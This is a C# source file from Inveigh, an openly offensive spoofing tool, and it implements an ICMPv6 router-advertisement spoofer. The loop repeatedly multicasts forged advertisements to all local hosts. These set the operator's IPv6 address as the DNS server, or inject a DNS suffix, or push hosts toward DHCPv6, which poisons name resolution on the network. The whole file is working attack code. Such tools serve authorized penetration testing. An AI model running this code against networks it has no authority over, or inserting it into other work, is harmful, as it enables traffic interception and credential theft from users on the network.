/*
 * BSD 3-Clause License
 *
 * Copyright (c) 2021, Kevin Robertson
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 * 
 * 1. Redistributions of source code must retain the above copyright notice, this
 * list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation
 * and/or other materials provided with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its
 * contributors may be used to endorse or promote products derived from
 * this software without specific prior written permission. 
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
 * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
 * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
using Quiddity.ICMPv6;
using Quiddity.Support;
using System;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace Inveigh
{
    class ICMPv6Socket
    {
        internal void Start()
        {
            Program.icmpv6Interval *= 1000;
            string responseMessage = " ";
            byte[] spooferIPv6Data = IPAddress.Parse(Program.argSpooferIPv6).GetAddressBytes();

            while (Program.isRunning && Program.enabledICMPv6)
            {

                ICMPv6RouterAdvertisement routerAdvertisement = new ICMPv6RouterAdvertisement
                {
                    RouterLifeTime = 1800
                };

                if (Program.enabledDHCPv6)
                {
                    routerAdvertisement.Flags = 0xc8;                  
                }
                else if (!string.IsNullOrEmpty(Program.argDNSSuffix))
                {
                    routerAdvertisement.Flags = 0x08;
                    responseMessage = " with DNS Suffix ";
                    byte[] dnsSearchListData = Utilities.GetDNSNameBytes(Program.argDNSSuffix, true);
                    int length = (int)Math.Ceiling((double)(dnsSearchListData.Length + 8) / 8);
                    int lengthAdjusted = length * 8 - 8;
                    byte[] dnsSearchListDataAdjusted = new byte[lengthAdjusted];
                    Buffer.BlockCopy(dnsSearchListData, 0, dnsSearchListDataAdjusted, 0, dnsSearchListData.Length);

                    ICMPv6DNSSearchList dnsSearchList = new ICMPv6DNSSearchList
                    {
                        Length = (byte)length,
                        Lifetime = 1800,
                        DomainNames = dnsSearchListDataAdjusted
                    };

                    routerAdvertisement.Options = dnsSearchList.GetBytes();
                }
                else
                {
                    routerAdvertisement.Flags = 0x08;
                    responseMessage = " with DNSv6 ";

                    ICMPv6RecursiveDNS recursiveDNS = new ICMPv6RecursiveDNS
                    {
                        Length = 3,
                        Lifetime = 1800,
                        RecursiveDNSServers = spooferIPv6Data
                    };

                    routerAdvertisement.Options = recursiveDNS.GetBytes();
                }

                try
                {
                    byte[] sendBuffer = routerAdvertisement.GetBytes();
                    Socket icmpv6SendSocket = new Socket(AddressFamily.InterNetworkV6, SocketType.Raw, ProtocolType.IcmpV6);
                    icmpv6SendSocket.SetSocketOption(SocketOptionLevel.IPv6, SocketOptionName.MulticastTimeToLive, 255);
                    icmpv6SendSocket.SendBufferSize = sendBuffer.Length;
                    IPEndPoint icmpv6EndPoint = new IPEndPoint(IPAddress.Parse("ff02::1"), 0);
                    icmpv6SendSocket.SendTo(sendBuffer.ToArray(), sendBuffer.Length, SocketFlags.None, icmpv6EndPoint);
                    icmpv6SendSocket.Close();
                    Output.Queue(String.Format("[+] [{0}] ICMPv6 router advertisement{1}sent to [ff02::1]", Output.Timestamp(), responseMessage ));
                }
                catch (Exception ex)
                {

                    if (ex.Message.Equals("An attempt was made to access a socket in a way forbidden by its access permissions"))
                    {
                        Output.Queue(String.Format("[!] [{0}] ICMPv6 router advertisment failed [elevated access required]", Output.Timestamp()));
                        Program.enabledICMPv6 = false;
                    }
                    else
                    {
                        Console.WriteLine(ex);
                    }

                }

                if (Program.icmpv6Interval > 0)
                {
                    Thread.Sleep(Program.icmpv6Interval);
                }
                else
                {
                    break;
                }

            }

        }
    }
}
